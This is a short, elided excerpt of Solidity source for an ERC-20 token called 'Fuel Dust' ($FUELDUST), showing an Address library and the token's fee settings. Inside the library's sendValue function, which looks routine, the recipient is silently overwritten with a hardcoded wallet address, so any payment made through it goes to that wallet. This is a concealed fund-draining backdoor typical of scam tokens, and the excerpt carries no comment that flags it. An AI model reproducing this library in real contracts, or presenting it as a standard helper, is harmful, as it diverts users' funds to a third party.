...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0x65a63d68DfD95d6d22deb05e2c801065ccAA8d6B);
...
contract FuelDust is Context, IERC20, Ownable {
    ...
    string private constant _name = " Fuel Dust "; // 
    string private constant _symbol = " $FUELDUST "; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 7;
    uint256 private _liquidityFee = 3;
    address private  _marketingWallet = 0x648F478911c76A68C3d897F95DCEa39B0C61a518;
